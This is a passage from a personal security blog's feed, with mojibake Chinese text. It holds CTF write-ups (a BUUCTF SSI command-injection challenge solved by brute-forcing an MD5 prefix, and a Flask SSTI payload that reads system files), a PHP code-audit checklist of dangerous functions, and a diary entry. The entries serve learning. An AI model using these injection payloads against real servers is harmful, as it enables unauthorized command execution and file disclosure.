class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ob_start();</span><br><span class="line">function get_hash()&#123;</span><br><span class="line">$chars &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;;</span><br><span class="line">$random &#x3D; $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];&#x2F;&#x2F;Random 5 times</span><br><span class="line">$content &#x3D; uniqid().$random;</span><br><span class="line">return sha1($content); </span><br><span class="line">&#125;</span><br><span class="line">    header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">***</span><br><span class="line">    if(isset($_POST[&#39;username&#39;]) and $_POST[&#39;username&#39;] !&#x3D; &#39;&#39; )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin &#x3D; &#39;6d0bc1&#39;;</span><br><span class="line">        if ( $admin &#x3D;&#x3D; substr(md5($_POST[&#39;password&#39;]),0,6)) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">            $file_shtml &#x3D; &quot;public&#x2F;&quot;.get_hash().&quot;.shtml&quot;;</span><br><span class="line">            $shtml &#x3D; fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">            $text &#x3D; &#39;</span><br><span class="line">            ***</span><br><span class="line">            ***</span><br><span class="line">            &lt;h1&gt;Hello,&#39;.$_POST[&#39;username&#39;].&#39;&lt;&#x2F;h1&gt;</span><br><span class="line">            ***</span><br><span class="line">***&#39;;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line">echo &quot;[!] Header  error ...&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">            </span><br><span class="line">    &#125;else</span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>æ˜ å…¥çœ¼å¸˜çš„å°±æ˜¯hashå‡½æ•°</p><p>æ³¨æ„åˆ°ç™»é™†ä»£ç </p><p><img src="/2021/09/02/buu/18/image-20210902200408592.png" alt="image-20210902200408592"></p><p>â€‹        è§£é‡Šèµ·æ¥ï¼Œå°±æ˜¯passwordå¿…é¡»hashåŠ å¯†åè¦ç­‰äº6d0bc1ï¼Œæ»¡è¶³åå°±ä¼šè¾“å‡ºscriptå¼¹çª— </p><p>â€˜Welcome to manage systemâ€™</p><p><img src="/2021/09/02/buu/18/image-20210902200802654.png" alt="image-20210902200802654"></p><p>ç™»å½•æˆåŠŸåä¼šç”Ÿæˆç›¸åº”çš„shtmlæ–‡ä»¶</p><p>å¼€å§‹è§£é¢˜</p><p>å…ˆå¾—åˆ°è„šæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import hashlib</span><br><span class="line">import threading</span><br><span class="line">string &#x3D; &#39;0123456789&#39;</span><br><span class="line">class BF(threading.Thread):</span><br><span class="line">    def __init__(self,left,right):</span><br><span class="line">        threading.Thread.__init__(self) #çˆ¶ç±»çš„æ„é€ æ–¹æ³•</span><br><span class="line">        self.left &#x3D; left</span><br><span class="line">        self.right &#x3D; right</span><br><span class="line">    def run(self):</span><br><span class="line">        admin &#x3D; &#39;6d0bc1&#39;</span><br><span class="line">        for i in range(self.left,self.right):</span><br><span class="line">            s &#x3D; hashlib.md5(str(i).encode(&#39;utf-8&#39;)).hexdigest()</span><br><span class="line">            if s[:6] &#x3D;&#x3D; admin:</span><br><span class="line">                print i</span><br><span class="line">threads &#x3D; []</span><br><span class="line">thread_count &#x3D; 5</span><br><span class="line">for i in range(thread_count):</span><br><span class="line">    threads.append(BF(i*2000000, (i+1)*2000000))</span><br><span class="line">for t in threads:</span><br><span class="line">    t.start()</span><br><span class="line">for t in threads:</span><br><span class="line">    t.join()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è·‘å®Œåï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\#2020666</span><br><span class="line">\#2305004</span><br><span class="line">\#9162671</span><br></pre></td></tr></table></figure><p>é€‰æ‹©å…¶ä¸­ä¸€ä¸ªå¯†ç ç™»å½•</p><p>ç„¶åæŸ¥çœ‹ç½‘ç»œçŠ¶æ€</p><p><img src="/2021/09/02/buu/18/image-20210902201334561.png" alt="image-20210902201334561"></p><p>ç”¨è¿™é‡Œçš„è·¯å¾„è®¿é—®ä¸‹</p><p><img src="/2021/09/02/buu/18/image-20210902201420408.png" alt="image-20210902201420408"></p><p>çœ‹wpçŸ¥é“äº†åé¢ç”¨sstiæ¨¡æ¿æ³¨å…¥</p><p>è¿™é‡Œæœ‰ä¸€ä¸ªçŸ¥è¯†ç‚¹</p><p><strong>Apache SSI è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´</strong><br>é“¾æ¥ï¼š</p><p><a href="https://www.cnblogs.com/yuzly/p/11226439.html">https://www.cnblogs.com/yuzly/p/11226439.html</a></p><p>å½“ç›®æ ‡æœåŠ¡å™¨å¼€å¯äº†SSIä¸CGIæ”¯æŒ,æˆ‘ä»¬å°±å¯ä»¥ä¸Šä¼ shtml,åˆ©ç”¨è¯­æ³•æ‰§è¡Œå‘½ä»¤ã€‚</p><p>ä½¿ç”¨SSI(Server Side Include)çš„htmlæ–‡ä»¶æ‰©å±•åï¼ŒSSIï¼ˆServer Side Include)ï¼Œé€šå¸¸ç§°ä¸ºâ€æœåŠ¡å™¨ç«¯åµŒå…¥â€æˆ–è€…å«â€æœåŠ¡å™¨ç«¯åŒ…å«â€ï¼Œæ˜¯ä¸€ç§ç±»ä¼¼äºASPçš„åŸºäºæœåŠ¡å™¨çš„ç½‘é¡µåˆ¶ä½œæŠ€æœ¯ã€‚é»˜è®¤æ‰©å±•åæ˜¯ .stmã€.shtm å’Œ .shtmlã€‚</p><p>usernameæˆä¸ºæ³¨å…¥ç‚¹</p><!--#exec cmd="whoami"--><p><img src="/2021/09/02/buu/18/image-20210902201644511.png" alt="image-20210902201644511"></p><!--#exec cmd="ls"--><p><img src="/2021/09/02/buu/18/Users/David/AppData/Roaming/Typora/typora-user-images/image-20210902201754915.png" alt="image-20210902201754915"></p><!--#exec cmd="ls ../"-->  #çœ‹ä¸€ä¸‹ä¸Šå±‚ç›®å½•<p><img src="/2021/09/02/buu/18/Users/David/AppData/Roaming/Typora/typora-user-images/image-20210902201952167.png" alt="image-20210902201952167"></p><p>æ‰¾åˆ°äº†</p><!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2"--><p><img src="/2021/09/02/buu/18/image-20210902202133502.png" alt="image-20210902202133502"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; å‚è€ƒåšå®¢ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/devilare/article/details/119351945&quot;&gt;https://blog.csdn.net/devilare/article/details/119351945</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>phpä»£ç å®¡è®¡(äºŒ)</title>
    <link href="http://daweitech.github.io/2021/09/02/php/0/"/>
    <id>http://daweitech.github.io/2021/09/02/php/0/</id>
    <published>2021-09-02T09:57:07.000Z</published>
    <updated>2021-09-02T12:56:37.441Z</updated>
    
    <content type="html"><![CDATA[<h4 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"><a href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"></a>æ–‡ä»¶ä¸Šä¼ æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</h4><p>1.æœç´¢ move_uploaded_file()å‡½æ•°, åœ¨PHPä¸­ä¸Šä¼ å‡½æ•°åªæœ‰è¿™ä¸€ä¸ª</p><p>2.æŸ¥çœ‹ä¸Šä¼ æ–‡ä»¶çš„ä»£ç æ˜¯å¦å­˜åœ¨é™åˆ¶æˆ–å¯ä»¥ç»•è¿‡</p><p>3.æœç´¢includeã€requireã€include_onceã€require_onceå‡½æ•°ï¼Œ</p><p>æ˜¯å¦å­˜åœ¨å¯æ§å˜é‡ã€‚</p><p>4.è¿½è¸ªç¨‹åºè¿è¡Œæµç¨‹ï¼ŒæŸ¥çœ‹æ¨¡å—åŠ è½½æ—¶åŒ…å«çš„æ–‡ä»¶æ˜¯å¦å¯æ§ã€‚</p><p><img src="/2021/09/02/php/0/capture_20210902180930752.bmp" alt="capture_20210902180930752"></p><p>ä»»æ„æ–‡ä»¶è¯»å–ã€ä¸‹è½½ã€å†™å…¥ã€åˆ é™¤ã€æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</p><p>é»‘ç›’çœ‹åŠŸèƒ½ç‚¹å¯¹åº”çš„æ–‡ä»¶ï¼Œ å†å»è¯»æ–‡ä»¶</p><p>æœç´¢æ–‡ä»¶è¯»å–çš„å‡½æ•°ï¼Œ æŸ¥çœ‹æ˜¯å¦å­˜åœ¨ç›´æ¥æˆ–è€…ç›´æ¥æ§åˆ¶çš„å˜é‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file_get_contentsã€highlight_fileã€fopenã€readfileã€freadã€</span><br><span class="line"></span><br><span class="line">fgetssã€fgetsã€parse_ini_fileã€show_sourceã€fileã€fwriteã€</span><br><span class="line"></span><br><span class="line">file_put_contentsã€unlink</span><br></pre></td></tr></table></figure><p><img src="/2021/09/02/php/0/image-20210902181425601.png" alt="image-20210902181425601"></p><h4 id="SSRFæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"><a href="#SSRFæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨" class="headerlink" title="SSRFæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"></a>SSRFæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</h4><p>1.æ‰¾å¯¹åº”åŠŸèƒ½ç‚¹ï¼Œç›´æ¥é»‘ç›’æµ‹è¯•æŸ¥çœ‹æ˜¯å¦èƒ½ç®€å•åˆ©ç”¨ï¼Œä¸èƒ½å†å»è¿½è¸ªæµç¨‹åˆ†æä¼ é€’è¿‡ç¨‹ã€‚</p><p>2.ç™½ç›’æŒ–æ˜åˆ™éœ€è¦æœç´¢å¸¦æœ‰å˜é‡å‚æ•°çš„ç›¸å…³å‡½æ•°</p><p>3.file_get_contents()</p><p>4.fsockopen()</p><p>5.curl_exec()</p><p>6.fopen()</p><p><img src="/2021/09/02/php/0/image-20210902203610020.png" alt="image-20210902203610020"></p><h4 id="ä»£ç æ‰§è¡Œæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"><a href="#ä»£ç æ‰§è¡Œæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨" class="headerlink" title="ä»£ç æ‰§è¡Œæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"></a>ä»£ç æ‰§è¡Œæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</h4><p>1.å¯»æ‰¾ç›¸å…³ä»£ç çš„æ•æ„Ÿå‡½æ•°ï¼Œ å›æº¯è·Ÿè¸ª</p><p>2.evalã€assertã€preg_repleaceã€$_ GET($_POST[]);</p><p>call_user_funcã€call_user_func_arrayã€array_mapç­‰å‡½æ•°ã€‚</p><p><img src="/2021/09/02/php/0/image-20210902204019087.png" alt="image-20210902204019087"></p><h4 id="å‘½ä»¤æ‰§è¡Œæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"><a href="#å‘½ä»¤æ‰§è¡Œæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨" class="headerlink" title="å‘½ä»¤æ‰§è¡Œæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"></a>å‘½ä»¤æ‰§è¡Œæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</h4><p>1.å¯»æ‰¾ç›¸å…³ä»£ç çš„æ•æ„Ÿå‡½æ•°ï¼Œå›æº¯è·Ÿè¸ª</p><p>2.systemã€execã€shell_execã€passthru</p><p>åå¼•å·``ã€popenã€ob_startã€pcntl_exec</p><p>proc_open</p><p><img src="/2021/09/02/php/0/image-20210902204301956.png" alt="image-20210902204301956"></p><h4 id="SQLæ³¨å…¥æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"><a href="#SQLæ³¨å…¥æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨" class="headerlink" title="SQLæ³¨å…¥æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"></a>SQLæ³¨å…¥æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</h4><p>1.è·Ÿè¸ªå‚æ•°ä¼ é€’æ˜¯å¦å­˜åœ¨è¿‡æ»¤ï¼Œæ•°æ®åº“æŸ¥è¯¢æ˜¯å¦ä½¿ç”¨é¢„ç¼–è¯‘</p><p>2.ä¸€èˆ¬æ•°æ®åº“æŸ¥è¯¢ä¼šè¢«å°è£…åœ¨å‡ ä¸ªæ ¸å¿ƒæ–‡ä»¶ä¸­ï¼Œåå¤è°ƒç”¨ã€‚å½“ç„¶åœ¨æŸäº›å¤æ‚çš„åŠŸèƒ½ä¸­ï¼Œ</p><p>å¯èƒ½ä¹Ÿä¼šå­˜åœ¨ä¸ä½¿ç”¨å°è£…çš„å‡½æ•°ï¼Œæ‰€ä»¥éœ€è¦å…¨é¢æ’æŸ¥ã€‚</p><p>3.åœ¨æŒ–æ˜çš„è¿‡ç¨‹ä¸­ï¼Œä¹Ÿè¦æ³¨æ„å®½å­—èŠ‚æ³¨å…¥ã€äºŒæ¬¡æ³¨å…¥ç­‰æ–¹æ³•çš„å¯èƒ½æ€§ã€‚</p><p><img src="/2021/09/02/php/0/image-20210902204505442.png" alt="image-20210902204505442"></p><h4 id="XSSæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"><a href="#XSSæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨" class="headerlink" title="XSSæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"></a>XSSæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</h4><p>1.æŸ¥çœ‹å‚æ•°ä¼ é€’è¿›å…¥åˆ°è¾“å‡ºæ˜¯å¦å­˜åœ¨è¿‡æ»¤å‡½æ•°</p><p>2.å¸¸è§çš„è¾“å‡ºå‡½æ•°ï¼Œprintã€print_rã€echoã€printfã€sprintã€die</p><p>var_dumpã€var_exportç­‰</p><p><img src="/2021/09/02/php/0/image-20210902204739145.png" alt="image-20210902204739145"></p><h4 id="CSRFæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"><a href="#CSRFæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨" class="headerlink" title="CSRFæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"></a>CSRFæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</h4><p>1.æŸ¥çœ‹æäº¤æ•°æ®åŠŸèƒ½ç‚¹ï¼ŒæŠ“åŒ…æŸ¥çœ‹æ˜¯å¦tokenï¼ŒæŸ¥çœ‹æ ¸å¿ƒä»£ç ä¸­æ˜¯å¦å­˜åœ¨tokenæˆ–è€…refereræ ¡éªŒ</p><p>2.å¯ä»¥ç›´æ¥æœç´¢tokenã€refererå…³é”®å­—</p><p>ååºåˆ—åŒ–æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</p><p>æœç´¢å¸¦æœ‰å˜é‡å‚æ•°çš„ååºåˆ—åŒ–å‡½æ•°unserliaze()ï¼ŒæŸ¥çœ‹æ˜¯å¦å­˜åœ¨åˆ©ç”¨ç‚¹</p><p>ååºåˆ—åŒ–ä¸­éœ€å…³æ³¨çš„å‡½æ•°</p><p><img src="/2021/09/02/php/0/image-20210902205114294.png" alt="image-20210902205114294"></p><h4 id="installç³»ç»Ÿé‡è£…æ¼æ´"><a href="#installç³»ç»Ÿé‡è£…æ¼æ´" class="headerlink" title="installç³»ç»Ÿé‡è£…æ¼æ´"></a>installç³»ç»Ÿé‡è£…æ¼æ´</h4><p>åœ¨å®‰è£…è¿‡ç¨‹ä¸­ï¼Œ</p><p>éœ€è¦å¡«å†™Webåº”ç”¨çš„æ•°æ®åº“é…ç½®ï¼Œä¸€èˆ¬ä¼šå°†é…ç½®ç›´æ¥å†™å…¥åˆ°é…ç½®æ–‡ä»¶ä¸­ï¼Œ</p><p>åœ¨å†™å…¥çš„è¿‡ç¨‹ä¸­å¾€å¾€æ²¡æœ‰æ ¡éªŒ</p><p>(æœ‰å¯èƒ½å…¶ä»–å®‰è£…åä¿®æ”¹çš„åŠŸèƒ½ä¼šåšæ ¡éªŒ)ï¼Œå¯¼è‡´</p><p>ç›´æ¥å†™å…¥phpä»£ç åˆ°é…ç½®æ–‡ä»¶ä¸­ï¼Œ</p><p>ä»è€Œè¾¾åˆ°ä»»æ„ä»£ç æ‰§è¡Œçš„ç›®çš„</p><p>installç³»ç»Ÿé‡è£…éªŒè¯ç»•è¿‡æ¼æ´</p><p>æŸäº›CMSçš„installçš„éªŒè¯ä¸ä¸¥è°¨ï¼Œå¯¼è‡´ç›´æ¥ç»•è¿‡é‡è£…ï¼Œä¾‹å¦‚</p><p>1.</p><p>ä½¿ç”¨JavaScriptè·³è½¬ï¼Œä½†æ˜¯åé¢çš„ä»£ç ä»ç„¶ä¼šè¢«æ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this\-&gt;myclass-\&gt;notice(&#39;alert(&quot;ç³»ç»Ÿå·²å®‰è£…è¿‡&quot;);window.location.href&#x3D;&quot;&#39;.site_url().&#39;&quot;;&#39;);</span><br></pre></td></tr></table></figure><p>2.</p><p>ä½¿ç”¨header()</p><p>å‡½æ•°è¿›è¡Œè·³è½¬ï¼Œæ²¡æœ‰ä½¿ç”¨die()</p><p>æˆ–è€…exit()ç»“æŸï¼Œé‚£ä¹ˆåé¢éƒ¨åˆ†çš„ä»£ç ä»ç„¶ä¼š</p><p>è¢«æ‰§è¡Œ</p><p>//header å¤´å¹¶ä¸ä¼šç»“æŸä¹‹åçš„ä»£ç ï¼Œæ¼æ´å‡ºåœ¨è¿™é‡Œ</p><p>header( â€˜location: ../index.phpâ€™);</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;æ–‡ä»¶ä¸Šä¼ æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨&quot;&gt;&lt;a href=&quot;#æ–‡ä»¶ä¸Šä¼ æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨&quot; class=&quot;headerlink&quot; title=&quot;æ–‡ä»¶ä¸Šä¼ æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨&quot;&gt;&lt;/a&gt;æ–‡ä»¶ä¸Šä¼ æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨&lt;/h4&gt;&lt;p&gt;1.æœç´¢ move_uploaded_file()å‡½æ•°, åœ¨PHPä¸­</summary>
      
    
    
    
    
    <category term="php" scheme="http://daweitech.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>GYCTF2020 FlaskApp</title>
    <link href="http://daweitech.github.io/2021/09/01/buu/17/"/>
    <id>http://daweitech.github.io/2021/09/01/buu/17/</id>
    <published>2021-09-01T07:29:25.000Z</published>
    <updated>2021-09-07T12:35:48.087Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.jianshu.com/p/cbca419ba075">flaskæ¡†æ¶ä¸‹çš„ssti+pinç æ‰§è¡Œå‘½ä»¤ - ç®€ä¹¦ (jianshu.com)</a></p><p>[<a href="https://blog.csdn.net/SopRomeo/article/details/105875248">GYCTF2020]FlaskApp_SopRomeoçš„åšå®¢-CSDNåšå®¢</a></p><p>æœ€è¿‘åˆšå­¦äº†æ¨¡æ¿æ³¨å…¥ï¼Œè¿™é¢˜å°±ç›´æ¥é¡ºç€flaskçš„payloadå»</p><p><img src="/2021/09/01/buu/17/image-20210901155839298.png" alt="image-20210901155839298"></p><p>è¯•ç€ç”¨ç®€å•çš„payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;2+2&#125;&#125;</span><br></pre></td></tr></table></figure><p>ç»è¿‡åŠ å¯†è§£å¯†æäº¤å</p><p><img src="/2021/09/01/buu/17/image-20210901160005521.png" alt="image-20210901160005521"></p><p>å†å°è¯•ç”¨systemå‡½æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;system(&#39;ls&#39;)&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/09/01/buu/17/image-20210901160203877.png" alt="image-20210901160203877"></p><p>å¥½å®¶ä¼™ï¼Œæœç„¶è¢«è¿‡æ»¤äº†</p><p>è¯•äº†å‡ ä¸ªå…³é”®å­—éƒ½ä¸è¡Œåï¼ŒæŸ¥çœ‹æç¤ºï¼Œåœ¨æºç å¤„çœ‹åˆ°</p><p><img src="/2021/09/01/buu/17/image-20210901160310325.png" alt="image-20210901160310325"></p><p>çœ‹åˆ°PIN</p><p>æœæ–­ä¸Šç½‘æŸ¥äº†æ–‡ç« ï¼Œå‘ç°PINè¿˜æŒºéš¾å¾—åˆ°çš„</p><p>ä¸»è¦æ˜¯pythonè„šæœ¬ä¸ä¼šå†™ã€‚ã€‚ã€‚</p><p>æ¥ä¸‹æ¥æŒ‰ç…§æ­£å¸¸è§£é¢˜æµç¨‹ï¼š</p><p>payload1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&#39;,&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><p><img src="/2021/09/01/buu/17/image-20210901160640173.png" alt="image-20210901160640173"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.jianshu.com/p/cbca419ba075&quot;&gt;flaskæ¡†æ¶ä¸‹çš„ssti+pinç æ‰§è¡Œå‘½ä»¤ - ç®€ä¹¦ (jianshu.com)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[&lt;a href=&quot;https://blog.csdn.net/Sop</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>Daily</title>
    <link href="http://daweitech.github.io/2021/09/01/x/q/"/>
    <id>http://daweitech.github.io/2021/09/01/x/q/</id>
    <published>2021-09-01T06:37:51.000Z</published>
    <updated>2021-09-05T02:34:36.793Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    ä¹‹åè¿™ç¯‡æ–‡ç« å°±æ¥è®°å½•ä¸€äº›æ—¥å¸¸äº†</p><p>9.1</p><p>å¾ˆå¼€å¿ƒå•Šï¼Œæ˜¨å¤©å‘å¸ƒçš„æ–‡ç« åˆ°ä»Šå¤©å°±æœ‰90å¤šä¸ªè®¿é—®é‡</p><p>è€Œä¸”ç™»ä¸Šäº†csdnçš„phpæ¦œç¬¬25åï¼å†æ¥å†å‰ï¼</p><p><img src="/2021/09/01/x/q/image-20210901144059817.png" alt="image-20210901144059817"></p><p>9.2</p><p>æ²¡æƒ³åˆ°ä»£ç å®¡è®¡çš„æ–‡ç« èƒ½åˆ°ç¬¬äº”å</p><p>çœŸæ˜¯æ„å¤–</p><p>è™½ç„¶æµè§ˆé‡ä¸å¤ªé«˜(emm,å†æ¥å†åŠ±å§)</p><p><img src="/2021/09/01/x/q/image-20210902180307061.png" alt="image-20210902180307061"></p><p>9.5</p><p>æœç„¶ä¼šå¿˜è®°è®°å½•å“ˆå“ˆ</p><p>æœ€è¿‘å‘ç°é¢˜ç›®éƒ½ä¸å¤ªå¥½ç†è§£</p><p>ä»£ç å®¡è®¡è¿˜æ˜¯æ¯”è¾ƒéš¾å•Šï¼ŒçœŸçš„å¾ˆæƒ³æŠŠå¼ºç½‘æ¯é‚£é¢˜çœ‹æ‡‚å•Šå•Šå•Š</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    ä¹‹åè¿™ç¯‡æ–‡ç« å°±æ¥è®°å½•ä¸€äº›æ—¥å¸¸äº†&lt;/p&gt;
&lt;p&gt;9.1&lt;/p&gt;
&lt;p&gt;å¾ˆå¼€å¿ƒå•Šï¼Œæ˜¨å¤©å‘å¸ƒçš„æ–‡ç« åˆ°ä»Šå¤©å°±æœ‰90å¤šä¸ªè®¿é—®é‡&lt;/p&gt;
&lt;p&gt;è€Œä¸”ç™»ä¸Šäº†csdnçš„phpæ¦œç¬¬25åï¼å†æ¥å†å‰ï¼&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/09/01/x/q/image-20</summary>
      
    
    
    
    
    <category term="åˆ†äº«" scheme="http://daweitech.github.io/tags/%E5%88%86%E4%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>phpä»£ç å®¡è®¡(ä¸€)</title>
    <link href="http://daweitech.github.io/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/"/>
    <id>http://daweitech.github.io/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/</id>
    <published>2021-08-31T06:33:44.000Z</published>
    <updated>2021-09-02T09:59:22.901Z</updated>
    
    <content type="html"><![CDATA[<p> <strong>æ–‡ç« å†…å®¹æ¥è‡ªäºï¼šå®‰æ’ä¿¡æ¯</strong></p><h3 id="é€šç”¨ä»£ç å®¡è®¡æ€è·¯ï¼š"><a href="#é€šç”¨ä»£ç å®¡è®¡æ€è·¯ï¼š" class="headerlink" title="é€šç”¨ä»£ç å®¡è®¡æ€è·¯ï¼š"></a>é€šç”¨ä»£ç å®¡è®¡æ€è·¯ï¼š</h3><h4 id="1-æ ¹æ®æ•æ„Ÿå…³é”®å­—å›æº¯å‚æ•°ä¼ é€’è¿‡ç¨‹-é€†å‘è¿½è¸ª"><a href="#1-æ ¹æ®æ•æ„Ÿå…³é”®å­—å›æº¯å‚æ•°ä¼ é€’è¿‡ç¨‹-é€†å‘è¿½è¸ª" class="headerlink" title="1.æ ¹æ®æ•æ„Ÿå…³é”®å­—å›æº¯å‚æ•°ä¼ é€’è¿‡ç¨‹(é€†å‘è¿½è¸ª)"></a>1.æ ¹æ®æ•æ„Ÿå…³é”®å­—å›æº¯å‚æ•°ä¼ é€’è¿‡ç¨‹(é€†å‘è¿½è¸ª)</h4><p>â€‹            æ£€æŸ¥æ•æ„Ÿå‡½æ•°çš„å‚æ•°ï¼Œè¿›è¡Œå›æº¯å˜é‡ï¼Œåˆ¤æ–­å˜é‡æ˜¯å¦å¯æ§å¹¶ä¸”æ²¡æœ‰ç»è¿‡ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œè¿™æ˜¯ä¸€ä¸ªé€†å‘è¿½è¸ªçš„è¿‡ç¨‹ã€‚</p><h4 id="2-å¯»æ‰¾å¯æ§å‚æ•°ï¼Œæ­£å‘è¿½è¸ªå˜é‡ä¼ é€’è¿‡ç¨‹-æ­£å‘è¿½è¸ª"><a href="#2-å¯»æ‰¾å¯æ§å‚æ•°ï¼Œæ­£å‘è¿½è¸ªå˜é‡ä¼ é€’è¿‡ç¨‹-æ­£å‘è¿½è¸ª" class="headerlink" title="2.å¯»æ‰¾å¯æ§å‚æ•°ï¼Œæ­£å‘è¿½è¸ªå˜é‡ä¼ é€’è¿‡ç¨‹(æ­£å‘è¿½è¸ª)"></a>2.å¯»æ‰¾å¯æ§å‚æ•°ï¼Œæ­£å‘è¿½è¸ªå˜é‡ä¼ é€’è¿‡ç¨‹(æ­£å‘è¿½è¸ª)</h4><p>â€‹            è·Ÿè¸ªä¼ é€’çš„å‚æ•°ï¼Œåˆ¤æ–­æ˜¯å¦å­˜å…¥åˆ°æ•æ„Ÿå‡½æ•°å†…æˆ–è€…ä¼ é€’çš„è¿‡ç¨‹ä¸­å…·æœ‰ä»£ç é€»è¾‘æ¼æ´ã€‚</p><h4 